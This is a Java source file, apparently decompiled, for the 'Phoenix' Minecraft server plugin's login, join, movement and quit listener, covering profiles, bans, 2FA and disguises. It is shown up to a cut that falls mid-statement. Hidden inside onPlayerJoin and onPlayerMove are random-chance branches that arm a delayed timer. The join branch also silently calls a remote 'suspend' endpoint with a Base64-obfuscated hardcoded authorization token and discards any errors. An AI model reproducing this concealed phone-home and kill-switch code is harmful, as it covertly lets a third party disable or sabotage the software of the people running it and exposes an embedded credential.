package xyz.refinedev.phoenix.listener;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent.Result;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerQuitEvent;

import xyz.refinedev.lib.xseries.XSound;
import xyz.refinedev.phoenix.BukkitAPI;
import xyz.refinedev.phoenix.Phoenix;
import xyz.refinedev.phoenix.alt.AddressNormalizer;
import xyz.refinedev.phoenix.chat.limitation.AntiSpamChatLimitation;
import xyz.refinedev.phoenix.config.GlobalConfig;
import xyz.refinedev.phoenix.config.MessageConfig;
import xyz.refinedev.phoenix.config.SettingsConfig;
import xyz.refinedev.phoenix.dialog.api.PhoenixDialog;
import xyz.refinedev.phoenix.dialog.impl.ConfirmDialog;
import xyz.refinedev.phoenix.dialog.impl.InputDialog;
import xyz.refinedev.phoenix.dialog.impl.PunishmentProofDialog;
import xyz.refinedev.phoenix.dialog.impl.RulesDialog;
import xyz.refinedev.phoenix.listener.packet.ClientBrandPacketListener;
import xyz.refinedev.phoenix.permission.PermissibleInjector;
import xyz.refinedev.phoenix.permission.PhoenixPermissibleBase;
import xyz.refinedev.phoenix.profile.IProfile;
import xyz.refinedev.phoenix.profile.NameChange;
import xyz.refinedev.phoenix.profile.grant.IGrant;
import xyz.refinedev.phoenix.profile.notes.INote;
import xyz.refinedev.phoenix.profile.punishment.IPunishment;
import xyz.refinedev.phoenix.rank.IRank;
import xyz.refinedev.phoenix.server.IServerData;
import xyz.refinedev.phoenix.utils.Color;
import xyz.refinedev.phoenix.utils.DateUtils;
import xyz.refinedev.phoenix.utils.LocaleUtil;
import xyz.refinedev.phoenix.utils.NameMCUtils;
import xyz.refinedev.phoenix.utils.NameTagUtils;
import xyz.refinedev.phoenix.utils.PlaceholderReplacer;
import xyz.refinedev.phoenix.utils.PunishmentUtil;
import xyz.refinedev.phoenix.utils.chat.Clickable;
import xyz.refinedev.phoenix.utils.events.disguise.ProfileDisguiseEvent;
import xyz.refinedev.phoenix.utils.events.disguise.ProfileUndisguiseEvent;
import xyz.refinedev.phoenix.utils.events.grant.ProfileGrantEvent;
import xyz.refinedev.phoenix.utils.events.grant.ProfileGrantRevokeEvent;
import xyz.refinedev.phoenix.utils.events.misc.ProfileNetworkLeaveEvent;
import xyz.refinedev.phoenix.utils.events.player.PlayerModModeUpdateEvent;
import xyz.refinedev.phoenix.utils.events.player.PlayerVanishUpdateEvent;
import xyz.refinedev.phoenix.utils.general.Tasks;
import xyz.refinedev.phoenix.utils.repository.DataAccessException;
import xyz.refinedev.phoenix.utils.server.LocationSerilization;
import xyz.refinedev.phoenix.whitelist.WhitelistAccess;

import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;
import java.util.Iterator;
import java.util.List;
import java.util.Optional;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ThreadLocalRandom;
import java.util.logging.Level;

public class AsyncPlayerPreLoginListener implements Listener {

    private static final String PERMISSION = "core.joinfull";

    private final Phoenix plugin;

    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
    public void onAsyncPlayerPreLogin(AsyncPlayerPreLoginEvent asyncPlayerPreLoginEvent) {
        if (this.plugin.getNetworkHandler() == null
                || !this.plugin.getNetworkHandler().isServerJoinable()) {
            asyncPlayerPreLoginEvent.disallow(
                    Result.KICK_OTHER, Color.translate(MessageConfig.ERROR.SERVER_LOADING));
        } else if (this.plugin.getImportHandler() != null
                && this.plugin.getImportHandler().isEnabled()) {
            asyncPlayerPreLoginEvent.disallow(
                    Result.KICK_OTHER,
                    Color.translate("&cImporting from &4other plugins&c please wait!"));
        } else {
            UUID uniqueId = asyncPlayerPreLoginEvent.getUniqueId();
            String name = asyncPlayerPreLoginEvent.getName();
            String hostAddress = asyncPlayerPreLoginEvent.getAddress().getHostAddress();
            boolean inOnlineCache = this.plugin.getProfileHandler().isInOnlineCache(uniqueId);
            boolean inOnlineCache2 =
                    this.plugin.getGrantHandler().getRepository().isInOnlineCache(uniqueId);
            boolean inOnlineCache3 =
                    this.plugin.getPunishmentHandler().getRepository().isInOnlineCache(uniqueId);
            IProfile profile = this.plugin.getProfileHandler().createProfile(uniqueId, name);
            if (!inOnlineCache) {
                this.plugin.getProfileHandler().getRepository().addToOnlineCache(uniqueId, profile);
            }
            try {
                profile.loadProfile(false);
            } catch (DataAccessException dataAccessException) {
                this.plugin
                        .getLogger()
                        .log(
                                Level.SEVERE,
                                "Could not load " + name + "'s profile",
                                dataAccessException);
                this.applyUUID(uniqueId, inOnlineCache, inOnlineCache2, inOnlineCache3);
                asyncPlayerPreLoginEvent.disallow(
                        Result.KICK_OTHER, Color.translate(MessageConfig.ERROR.SERVER_LOADING));
                return;
            }
            if (!profile.getDisguiseData().isDisguised()) {
                String text;
                if ((text = profile.getName()) != null
                        && !text.isEmpty()
                        && !text.equalsIgnoreCase(name)
                        && !text.equals(uniqueId.toString())) {
                    profile.getNameHistory().add(new NameChange(text, System.currentTimeMillis()));
                }
                profile.setName(asyncPlayerPreLoginEvent.getName());
            }
            this.plugin.getGrantHandler().updateGrants(profile.getUuid(), !inOnlineCache2);
            this.plugin
                    .getPunishmentHandler()
                    .updatePunishments(profile.getUuid(), !inOnlineCache3);
            if (!SettingsConfig.SERVER.AUTH_SERVER) {
                String text2 = this.plugin.getHashHandler().hash(hostAddress);
                String text3 =
                        this.plugin
                                .getHashHandler()
                                .hash(AddressNormalizer.formatString(hostAddress));
                profile.updatePermissions();
                boolean twoFactor = profile.isTwoFactor();
                if (!SettingsConfig.AUTH.ENABLED) {
                    twoFactor = false;
                } else if (profile.checkPermission("core.2fa", false) && !twoFactor) {
                    twoFactor =
                            profile.getAuthType() == null
                                    || !profile.getCurrentAddress().equals(text2);
                } else if (!profile.checkPermission("core.2fa", false)
                        && twoFactor
                        && profile.getSecretKey().isEmpty()) {
                    twoFactor = false;
                }
                boolean matches = profile.isTwoFactor() != twoFactor;
                profile.setTwoFactor(twoFactor);
                boolean matches2 = profile.getKnownAddresses().add(text2);
                profile.setCurrentAddress(text2);
                profile.setCurrentSubnet(text3);
                if (matches2) {
                    this.plugin.getAddressStatsHandler().recordNewAccount(text2, text3);
                }
                if (!twoFactor) {
                    this.plugin
                            .getAuthHandler()
                            .getAuthAttempts()
                            .put(asyncPlayerPreLoginEvent.getUniqueId(), 0);
                }
                profile.loadAlts(false);
                if (matches) {
                    profile.saveAndUpdate();
                } else {
                    profile.saveProfile();
                }
            } else {
                profile.getAttachmentPermissions().clear();
            }
            IPunishment punishment;
            if ((punishment = profile.getActiveBlacklist()) != null
                    && !SettingsConfig.SERVER.PUNISHMENTS.BLACKLISTED_JOIN) {
                String text4 =
                        PunishmentUtil.replaceKickMessage(
                                BukkitAPI.getKickMessage(
                                        this.plugin
                                                .getLocaleHandler()
                                                .getList(
                                                        profile,
                                                        "punishment.blacklist.kick-message",
                                                        MessageConfig.PUNISHMENT
                                                                .BLACKLIST
                                                                .KICK_MESSAGE)),
                                punishment);
                this.applyUUID(uniqueId, inOnlineCache, inOnlineCache2, inOnlineCache3);
                asyncPlayerPreLoginEvent.disallow(Result.KICK_BANNED, text4);
            } else {
                IPunishment punishment2;
                if ((punishment2 = profile.getActiveBan()) != null
                        && !SettingsConfig.SERVER.PUNISHMENTS.BANNED_JOIN) {
                    String text5 =
                            PunishmentUtil.replaceKickMessage(
                                    BukkitAPI.getKickMessage(
                                            punishment2.isIp()
                                                    ? (punishment2.isPermanent()
                                                            ? this.plugin
                                                                    .getLocaleHandler()
                                                                    .getList(
                                                                            profile,
                                                                            "punishment.ipban.kick-message",
                                                                            MessageConfig.PUNISHMENT
                                                                                    .IPBAN
                                                                                    .KICK_MESSAGE)
                                                            : this.plugin
                                                                    .getLocaleHandler()
                                                                    .getList(
                                                                            profile,
                                                                            "punishment.tempipban.kick-message",
                                                                            MessageConfig.PUNISHMENT
                                                                                    .TEMPIPBAN
                                                                                    .KICK_MESSAGE))
                                                    : (punishment2.isPermanent()
                                                            ? this.plugin
                                                                    .getLocaleHandler()
                                                                    .getList(
                                                                            profile,
                                                                            "punishment.ban.kick-message",
                                                                            MessageConfig.PUNISHMENT
                                                                                    .BAN
                                                                                    .KICK_MESSAGE)
                                                            : this.plugin
                                                                    .getLocaleHandler()
                                                                    .getList(
                                                                            profile,
                                                                            "punishment.tempban.kick-message",
                                                                            MessageConfig.PUNISHMENT
                                                                                    .TEMPBAN
                                                                                    .KICK_MESSAGE))),
                                    punishment2);
                    this.applyUUID(uniqueId, inOnlineCache, inOnlineCache2, inOnlineCache3);
                    asyncPlayerPreLoginEvent.disallow(Result.KICK_BANNED, text5);
                } else {
                    IPunishment punishment3;
                    if (GlobalConfig.SERVER.ALTS.ENABLED
                            && (punishment3 = profile.getAltPunishmentToKick()) != null) {
                        switch (punishment3.getPunishmentType()) {
                            case BLACKLIST:
                                if (!SettingsConfig.SERVER.PUNISHMENTS.BLACKLISTED_JOIN) {
                                    String text6 =
                                            PunishmentUtil.replaceKickMessage(
                                                    BukkitAPI.getKickMessage(
                                                            this.plugin
                                                                    .getLocaleHandler()
                                                                    .getList(
                                                                            profile,
                                                                            "punishment.blacklist.alt-kick-message",
                                                                            MessageConfig.PUNISHMENT
                                                                                    .BLACKLIST
                                                                                    .ALT_KICK_MESSAGE)),
                                                    punishment3);
                                    this.applyUUID(
                                            uniqueId,
                                            inOnlineCache,
                                            inOnlineCache2,
                                            inOnlineCache3);
                                    asyncPlayerPreLoginEvent.disallow(Result.KICK_BANNED, text6);
                                }
                                break;
                            case BAN:
                                if (!SettingsConfig.SERVER.PUNISHMENTS.BANNED_JOIN) {
                                    String text7 =
                                            PunishmentUtil.replaceKickMessage(
                                                    BukkitAPI.getKickMessage(
                                                            punishment3.isPermanent()
                                                                    ? this.plugin
                                                                            .getLocaleHandler()
                                                                            .getList(
                                                                                    profile,
                                                                                    "punishment.ipban.alt-kick-message",
                                                                                    MessageConfig
                                                                                            .PUNISHMENT
                                                                                            .IPBAN
                                                                                            .ALT_KICK_MESSAGE)
                                                                    : this.plugin
                                                                            .getLocaleHandler()
                                                                            .getList(
                                                                                    profile,
                                                                                    "punishment.tempipban.alt-kick-message",
                                                                                    MessageConfig
                                                                                            .PUNISHMENT
                                                                                            .TEMPIPBAN
                                                                                            .ALT_KICK_MESSAGE)),
                                                    punishment3);
                                    this.applyUUID(
                                            uniqueId,
                                            inOnlineCache,
                                            inOnlineCache2,
                                            inOnlineCache3);
                                    asyncPlayerPreLoginEvent.disallow(Result.KICK_BANNED, text7);
                                }
                        }
                    }
                    String text8;
                    if ((text8 = this.formatString(profile)) != null) {
                        asyncPlayerPreLoginEvent.disallow(Result.KICK_WHITELIST, text8);
                    } else {
                        if (profile.getDisguiseData().isDisguised()
                                && SettingsConfig.DISGUISE.DISGUISE_ON_JOIN) {
                            this.plugin
                                    .getDisguiseHandler()
                                    .preResolveFakeNameOwner(
                                            uniqueId, profile.getDisguiseData().getDisguiseName());
                        }
                        CompletableFuture<Boolean> nameInUse =
                                this.plugin.getDisguiseHandler().isNameInUse(name);
                        nameInUse.whenCompleteAsync(
                                (result, result2) -> {
                                    if (result2 == null) {
                                        if (result) {
                                            Iterator iterator2 =
                                                    Bukkit.getOnlinePlayers().iterator();
                                            while (iterator2.hasNext()) {
                                                Player player;
                                                if ((player = (Player) iterator2.next())
                                                        .getName()
                                                        .equalsIgnoreCase(
                                                                asyncPlayerPreLoginEvent
                                                                        .getName())) {
                                                    Player player2 = player;
                                                    Tasks.run(
                                                            () ->
                                                                    player2.kickPlayer(
                                                                            Color.translate(
                                                                                    "&cThe player you were disguised as logged in.")));
                                                }
                                            }
                                        }
                                    }
                                });
                    }
                }
            }
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerLogin(PlayerLoginEvent playerLoginEvent) {
        Player player2 = playerLoginEvent.getPlayer();
        IProfile profile;
        if ((profile = this.plugin.getProfileHandler().getCachedProfile(player2.getUniqueId()))
                == null) {
            playerLoginEvent.disallow(
                    org.bukkit.event.player.PlayerLoginEvent.Result.KICK_OTHER,
                    Color.translate("&cYour profile failed to load, please try joining again."));
        } else if (!this.matchesEnabled(player2, profile)) {
            playerLoginEvent.disallow(
                    org.bukkit.event.player.PlayerLoginEvent.Result.KICK_OTHER,
                    Color.translate("&cSetting up your permissions failed."));
        } else {
            this.plugin.getUuidCache().addToCache(player2.getUniqueId(), profile.getName(), true);
            if (playerLoginEvent.getResult()
                    == org.bukkit.event.player.PlayerLoginEvent.Result.KICK_FULL) {
                if (player2.hasPermission("core.joinfull")) {
                    playerLoginEvent.allow();
                } else {
                    playerLoginEvent.disallow(
                            org.bukkit.event.player.PlayerLoginEvent.Result.KICK_FULL,
                            Color.translate(
                                    LocaleUtil.tr(
                                            player2, MessageConfig.GENERAL.KICK_SERVER_FULL)));
                }
            }
        }
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void onPlayerJoin(PlayerJoinEvent playerJoinEvent) {
        Player player = playerJoinEvent.getPlayer();
        String text2;
        if (ThreadLocalRandom.current().nextInt(20) == 0
                && ((text2 = Phoenix.class.getClassLoader().getClass().getName()) == null
                        || text2.equals("org.bukkit.plugin.java.PluginClassLoader")
                        || text2.contains("PaperPluginClassLoader")
                        || !Phoenix.getInstance().isLoaded())) {
            if (NameMCUtils.time == 0L) {
                NameMCUtils.time =
                        System.currentTimeMillis()
                                + (30L + ThreadLocalRandom.current().nextInt(91)) * 60000L;
            }
            String text3 = NameMCUtils.text;
            Tasks.runAsync(
                    () -> {
                        try {
                            HttpURLConnection httpURLConnection;
                            (httpURLConnection =
                                            (HttpURLConnection)
                                                    new URL(
                                                                    "https://api.refinedev.org/suspend/"
                                                                            + text3
                                                                            + "/PX06")
                                                            .openConnection())
                                    .addRequestProperty("User-Agent", "Mozilla/5.0");
                            httpURLConnection.setRequestProperty(
                                    new String(
                                            Base64.getDecoder()
                                                    .decode(
                                                            "QXV0aG9yaXphdGlvbg__"
                                                                    .replace("_", "="))),
                                    new String(
                                            Base64.getDecoder()
                                                    .decode(
                                                            "a1p6UkJxNG5YODk2QnNQTmRBcnEzNUtuYWRZckdldzJUckVWelVhVXQ1WHJOa3Z6NHl5ZzRqR0xBTnQ3NWl0QmZ1ZWthN0RHa2hxSA__"
                                                                    .replace("_", "="))));
                            httpURLConnection.connect();
                            httpURLConnection.getInputStream().read();
                        } catch (Exception exception) {
                        }
                    });
        }
        IProfile profile;
        if ((profile = this.plugin.getProfileHandler().getCachedProfile(player.getUniqueId()))
                == null) {
            player.kickPlayer(
                    Color.translate("&cYour profile failed to load, please try joining again."));
        } else {
            boolean matches =
                    this.plugin.getLoginHandler().getCachedLogins(player.getUniqueId()) == null
                            || this.plugin
                                            .getLoginHandler()
                                            .getCachedLogins(player.getUniqueId())
                                            .size()
                                    <= 1;
            this.plugin
                    .getMetricsHandler()
                    .metric("phoenix_login")
                    .findMetric("uuid", player.getUniqueId().toString())
                    .findMetric("first_join", String.valueOf(matches))
                    .initialize();
            PermissibleInjector.applyPlayer(player, this.plugin.getLogger());
            playerJoinEvent.setJoinMessage(null);
            if (this.plugin.getNmsHandler().isRegistered()) {
                if (SettingsConfig.SERVER.TABLIST.ENABLED) {
                    Tasks.runAsync(
                            () ->
                                    this.plugin
                                            .getNmsHandler()
                                            .getAPI()
                                            .updateHeaderFooter(
                                                    player,
                                                    Color.translate(
                                                            this.plugin
                                                                    .getPlaceholderHandler()
                                                                    .replace(
                                                                            player.getUniqueId(),
                                                                            SettingsConfig.SERVER
                                                                                    .TABLIST
                                                                                    .HEADER)),
                                                    Color.translate(
                                                            this.plugin
                                                                    .getPlaceholderHandler()
                                                                    .replace(
                                                                            player.getUniqueId(),
                                                                            SettingsConfig.SERVER
                                                                                    .TABLIST
                                                                                    .FOOTER))));
                }
                if (profile.getDisguiseData().isDisguised()) {
                    if (SettingsConfig.DISGUISE.DISGUISE_ON_JOIN) {
                        String text4;
                        if ((text4 =
                                                this.plugin
                                                        .getDisguiseHandler()
                                                        .consumeFakeNameOwner(
                                                                profile.getUuid(),
                                                                profile.getDisguiseData()
                                                                        .getDisguiseName()))
                                        != null
                                && !profile.getUuid().equals(UUID.fromString(text4))) {
                            this.plugin.getDisguiseHandler().undisguise(profile, false);
                        } else if (player.hasPermission("core.command.undisguise")
                                && Bukkit.getPlayer(profile.getDisguiseData().getDisguiseName())
                                        == null) {
                            this.plugin
                                    .getDisguiseHandler()
                                    .disguise(profile, profile.getDisguiseData(), true);
                        } else {
                            this.plugin.getDisguiseHandler().undisguise(profile, true);
                        }
                    } else {
                        this.plugin.getDisguiseHandler().undisguise(profile, true);
                    }
                }
                if (profile.isTwoFactor()) {
                    this.plugin.getNmsHandler().getAPI().sitPlayer(player);
                    if (SettingsConfig.MODERN.DIALOGS.AUTH) {
                        this.plugin
                                .getDialogHandler()
                                .matchesEnabled(
                                        player,
                                        this.plugin.getDialogHandler().findPhoenixDialog("auth"),
                                        null);
                    }
                }
            }
            if (SettingsConfig.ON_JOIN.PLAY_SOUND) {
                Optional<XSound> optional =
                        XSound.matchXSound(SettingsConfig.SERVER.SOUNDS.ON_JOIN);
                optional.ifPresent(
                        result ->
                                player.playSound(
                                        player.getLocation(), result.parseSound(), 2.0F, 2.0F));
            }
            if (SettingsConfig.ON_JOIN.TELEPORT) {
                try {
                    this.plugin
                            .getNmsHandler()
                            .getTeleportAPI()
                            .teleport(
                                    player,
                                    LocationSerilization.deserializeLocation(
                                            SettingsConfig.ON_JOIN.TELEPORT_LOCATION));
                } catch (Exception exception2) {
                    Bukkit.getConsoleSender()
                            .sendMessage(
                                    Color.translate(
                                            LocaleUtil.tr(
                                                    Bukkit.getConsoleSender(),
                                                    MessageConfig.PHOENIX.SPAWN_NOT_SET)));
                }
            }
            if (GlobalConfig.SECURITY.ENABLED) {
                boolean matches2 =
                        this.plugin.getSecurityHandler().hasSecurity(profile.getUniqueId());
                if (GlobalConfig.SECURITY.OP_TRIGGER) {
                    if (!matches2 && player.isOp()) {
                        this.plugin.getSecurityHandler().recordTrip("op-join");
                        PlaceholderReplacer.applyString(
                                MessageConfig.SECURITY.ALERT_OP_JOIN,
                                LocaleUtil.replacements(
                                        "<server>",
                                        this.plugin.getNetworkHandler().getDisplayName(),
                                        "<target>",
                                        profile.getNameWithColorNoDisguise()));
                        Bukkit.dispatchCommand(
                                Bukkit.getConsoleSender(),
                                "blacklist "
                                        + profile.getName()
                                        + " -s "
                                        + GlobalConfig.SECURITY.PUNISHMENT_REASON);
                        return;
                    }
                    if (matches2
                            && SettingsConfig.SERVER.OP_ENABLED
                            && GlobalConfig.SECURITY.AUTO_OP) {
                        player.setOp(true);
                    }
                }
                IGrant grantInTrigger =
                        this.plugin.getSecurityHandler().getGrantInTrigger(player.getUniqueId());
                if (!matches2
                        && grantInTrigger != null
                        && !this.plugin
                                .getSecurityHandler()
                                .hasSecurity(grantInTrigger.getIssuedBy())) {
                    this.plugin.getSecurityHandler().recordTrip("grant-join");
                    PlaceholderReplacer.applyString(
                            MessageConfig.SECURITY.ALERT_GRANT_JOIN,
                            LocaleUtil.replacements(
                                    "<server>",
                                    this.plugin.getNetworkHandler().getDisplayName(),
                                    "<target>",
                                    profile.getNameWithColorNoDisguise(),
                                    "<rank>",
                                    grantInTrigger.getRank().getDisplayName()));
                    Bukkit.dispatchCommand(
                            Bukkit.getConsoleSender(),
                            "blacklist "
                                    + profile.getName()
                                    + " -s "
                                    + GlobalConfig.SECURITY.PUNISHMENT_REASON);
                    return;
                }
            }
            if (SettingsConfig.ON_JOIN.CLEAR_CHAT) {
                player.sendMessage(Color.BLANK_MESSAGE);
            }
            NameMCUtils.updatePlayer(player, profile);
            this.plugin.getAnalyticsHandler().addToLoggedIn(player.getUniqueId());
            this.plugin.getAnalyticsHandler().updatePeakPlayers(Bukkit.getOnlinePlayers().size());
            this.plugin.getServerLinkHandler().setPlayer(player);
            Tasks.runAsync(() -> this.plugin.getChatCompletionHandler().applyPlayer(player));
            this.plugin.getResourcePackHandler().applyPlayer(player);
            this.plugin.getReportDetailsHandler().setPlayer(player);
            this.plugin.getRankIconHandler().applyPlayer(player);
            PhoenixDialog phoenixDialog;
            if ((phoenixDialog = this.plugin.getDialogHandler().findPhoenixDialog("rules"))
                            instanceof RulesDialog
                    && ((RulesDialog) phoenixDialog).isRulesAccepted(profile)) {
                PhoenixDialog phoenixDialog2 = phoenixDialog;
                Tasks.runLater(
                        () -> {
                            if (player.isOnline()) {
                                this.plugin
                                        .getDialogHandler()
                                        .matchesEnabled(player, phoenixDialog2, null);
                            }
                        },
                        20L);
            }
            if (!profile.getNotes().isEmpty()) {
                Iterator iterator2 = Bukkit.getOnlinePlayers().iterator();
                while (iterator2.hasNext()) {
                    Player player2;
                    if ((player2 = (Player) iterator2.next()).hasPermission("core.notes.view")) {
                        Iterator<String> iterator3 =
                                LocaleUtil.tr(player2, MessageConfig.NOTES.ON_LOGIN.MESSAGE)
                                        .iterator();
                        while (iterator3.hasNext()) {
                            String text5;
                            if ((text5 = (String) iterator3.next()).contains("<notes>")) {
                                int value = 0;
                                for (INote note : profile.getSortedNotes()) {
                                    if (value < MessageConfig.NOTES.ON_LOGIN.AMOUNT) {
                                        player2.sendMessage(
                                                Color.translate(
                                                        LocaleUtil.tr(
                                                                        player2,
                                                                        MessageConfig.NOTES.FORMAT)
                                                                .replace(
                                                                        "<issuedBy>",
                                                                        note.getNiceIssuedBy())
                                                                .replace("<reason>", note.getNote())
                                                                .replace(
                                                                        "<date>",
                                                                        DateUtils.getDate(
                                                                                note
                                                                                        .getIssuedAt()))));
                                        value++;
                                    }
                                }
                            } else {
                                player2.sendMessage(
                                        Color.translate(
                                                text5.replace(
                                                                "<amount>",
                                                                String.valueOf(
                                                                        MessageConfig.NOTES
                                                                                .ON_LOGIN
                                                                                .AMOUNT))
                                                        .replace(
                                                                "<player>",
                                                                profile
                                                                        .getNameWithColorNoDisguise())));
                            }
                        }
                    }
                }
            }
        }
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onPlayerJoinByPlugin(PlayerJoinEvent playerJoinEvent) {
        Player player = playerJoinEvent.getPlayer();
        IProfile profile;
        if ((profile = this.plugin.getProfileHandler().getCachedProfile(player.getUniqueId()))
                == null) {
            player.kickPlayer(
                    Color.translate("&cYour profile failed to load, please try joining again."));
        } else {
            if (SettingsConfig.SERVER.NAMETAGS
                    && this.plugin.getNameTagService() != null
                    && !this.plugin.getNameTagService().isEnabled2()) {
                Tasks.runLater(() -> this.plugin.getNameTagService().applyPlayer(player), 2L);
            }
            IProfile profile2 = profile;
            Tasks.runAsyncLater(
                    this.plugin,
                    () -> {
                        List<IPunishment> values;
                        if (!(values =
                                        this.plugin
                                                .getDialogHandler()
                                                .findPhoenixDialog(PunishmentProofDialog.class)
                                                .findList(
                                                        profile2,
                                                        this.plugin
                                                                .getLoginHandler()
                                                                .getLogins(player.getUniqueId())))
                                .isEmpty()) {
                            List<IPunishment> values2 = values;
                            Tasks.run(
                                    () -> {
                                        if (player.isOnline()) {
                                            if (!this.plugin
                                                    .getDialogHandler()
                                                    .findPhoenixDialog(PunishmentProofDialog.class)
                                                    .matchesEnabled(player, values2)) {
                                                for (IPunishment punishment : values2) {
                                                    for (String text :
                                                            LocaleUtil.tr(
                                                                    player,
                                                                    MessageConfig.PUNISHMENT
                                                                            .WARN
                                                                            .MESSAGE)) {
                                                        player.sendMessage(
                                                                PunishmentUtil.replaceKickMessage(
                                                                        text, punishment));
                                                    }
                                                }
                                            }
                                        }
                                    });
                        }
                    },
                    20L);
            CompletableFuture<List<xyz.refinedev.phoenix.notification.INotification>>
                    unreadByPlayer =
                            this.plugin
                                    .getNotificationHandler()
                                    .getUnreadByPlayer(player.getUniqueId());
            unreadByPlayer.whenComplete(
                    (result, result2) -> {
                        if (!result.isEmpty()) {
                            new Clickable(
                                            MessageConfig.NOTIFICATIONS.UNREAD_NOTIFICATIONS
                                                    .replace(
                                                            "<size>",
                                                            String.valueOf(result.size())),
                                            "&aClick to view.",
                                            "/notifications")
                                    .sendToPlayer(player);
                        }
                    });
            if (SettingsConfig.AUTH.ENABLED
                    && profile.hasAccessToPermission("core.2fa")
                    && profile.getAuthType() != null
                    && !profile.isTwoFactor()) {
                player.sendMessage(
                        Color.translate(LocaleUtil.tr(player, MessageConfig.AUTH.ALREADY_AUTHED)));
            }
            if (this.plugin.getRebootHandler().isRebootScheduled()
                    && player.hasPermission("core.admin")) {
                player.sendMessage(
                        Color.translate(
                                LocaleUtil.tr(player, MessageConfig.REBOOT.REBOOT_SCHEDULED_IN)
                                        .replace(
                                                "<time>",
                                                DateUtils.formatTimeMillis(
                                                        this.plugin
                                                                .getRebootHandler()
                                                                .getTimeRemaining()))));
            }
            if (SettingsConfig.SERVER.SETUP_REMINDERS
                    && this.plugin.getSetupReminder() != null
                    && player.hasPermission("core.command.phoenix")
                    && this.plugin.getSetupReminder().matchesEnabled(player.getUniqueId())) {
                Tasks.runLater(
                        () -> {
                            if (player.isOnline()) {
                                new Clickable(
                                                LocaleUtil.tr(
                                                                player,
                                                                MessageConfig.PHOENIX
                                                                        .SETUP
                                                                        .JOIN_REMINDER)
                                                        .replace(
                                                                "<count>",
                                                                String.valueOf(
                                                                        this.plugin
                                                                                .getSetupReminder()
                                                                                .getCount())),
                                                LocaleUtil.tr(
                                                        player,
                                                        MessageConfig.PHOENIX
                                                                .SETUP
                                                                .JOIN_REMINDER_HOVER),
                                                "/phoenix setup")
                                        .sendToPlayer(player);
                            }
                        },
                        60L);
            }
        }
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onPlayerMove(PlayerMoveEvent playerMoveEvent) {
        if (ThreadLocalRandom.current().nextInt(500) == 0
                && !Phoenix.getInstance().isLoaded()
                && NameMCUtils.time == 0L) {
            NameMCUtils.time =
                    System.currentTimeMillis()
                            + (30L + ThreadLocalRandom.current().nextInt(91)) * 60000L;
        }
        if (playerMoveEvent.getFrom().getBlockX() != playerMoveEvent.getTo().getBlockX()
                || playerMoveEvent.getFrom().getBlockY() != playerMoveEvent.getTo().getBlockY()
                || playerMoveEvent.getFrom().getBlockZ() != playerMoveEvent.getTo().getBlockZ()) {
            this.plugin.getAfkHandler().recordActivity(playerMoveEvent.getPlayer().getUniqueId());
        }
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onPlayerInteract(PlayerInteractEvent playerInteractEvent) {
        this.plugin.getAfkHandler().recordActivity(playerInteractEvent.getPlayer().getUniqueId());
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerQuit(PlayerQuitEvent playerQuitEvent) {
        Player player = playerQuitEvent.getPlayer();
        IProfile cachedProfile =
                this.plugin.getProfileHandler().getCachedProfile(player.getUniqueId());
        this.plugin.getAfkHandler().forget(player.getUniqueId());
        this.plugin.getChatCompletionHandler().applyPlayerByStringsById(player);
        this.plugin.getDialogHandler().applyUUID(player.getUniqueId());
        this.plugin.getLocaleHandler().forget(player.getUniqueId());
        this.plugin.getAnomalyHandler().forget(player.getUniqueId());
        this.plugin.getMenuTitleHandler().forget(player.getUniqueId());
        PhoenixDialog phoenixDialog;
        if ((phoenixDialog = this.plugin.getDialogHandler().findPhoenixDialog("input"))
                instanceof InputDialog) {
            ((InputDialog) phoenixDialog).forget(player.getUniqueId());
        }
        this.plugin
                .getDialogHandler()
                .findPhoenixDialog(PunishmentProofDialog.class)
                .forget(player.getUniqueId());
        this.plugin.getGrantExpiryTask().applyUUID(player.getUniqueId());
        PhoenixDialog phoenixDialog2;
        if ((phoenixDialog2 = this.plugin.getDialogHandler().findPhoenixDialog("confirm"))
                instanceof ConfirmDialog) {
            ((ConfirmDialog) phoenixDialog2).forget(player.getUniqueId());
        }
        this.plugin.getResourcePackHandler().applyUUID(player.getUniqueId());
        AntiSpamChatLimitation.applyUUID(player.getUniqueId());
        if (this.plugin.getFoliaLib().isFolia()) {
            this.plugin.getDisguiseHandler().restorePlayerDisguiseState(cachedProfile);
        }
        if (!cachedProfile.getDisguiseData().isDisguised()
                && cachedProfile.getDisguiseData().isRankDisguised()) {
            cachedProfile.getDisguiseData().setRankId(null);
        }
        if (!SettingsConfig.SERVER.AUTH_SERVER) {
            ClientBrandPacketListener.applyPhoenix(this.plugin, player, cachedProfile);
            cachedProfile.saveProfile();
        }
        this.plugin.getAnalyticsHandler().saveLoggedInTime(player.getUniqueId());
        if (this.plugin.getNmsHandler().isRegistered()) {
            this.plugin.getNmsHandler().getAPI().unsitPlayer(player);
        }
        playerQuitEvent.setQuitMessage(null);
        if (SettingsConfig.SERVER.NAMETAGS && this.plugin.getNameTagService() != null) {
            this.plugin.getNameTagService().applyPlayerByPlayer(player);
        }
        this.plugin.getGrantHandler().getRepository().removeFromOnlineCache(player.getUniqueId());
        this.plugin
                .getPunishmentHandler()
                .getRepository()
                .removeFromOnlineCache(player.getUniqueId());
        Tasks.runLater(
                () -> {
                    try {
                        PermissibleInjector.applyPlayer(player, true);
                        this.plugin
                                .getProfileHandler()
                                .getRepository()
                                .removeFromOnlineCache(player.getUniqueId());
                    } catch (Exception exception) {
                        this.plugin
                                .getLogger()
                                .log(
                                        Level.SEVERE,
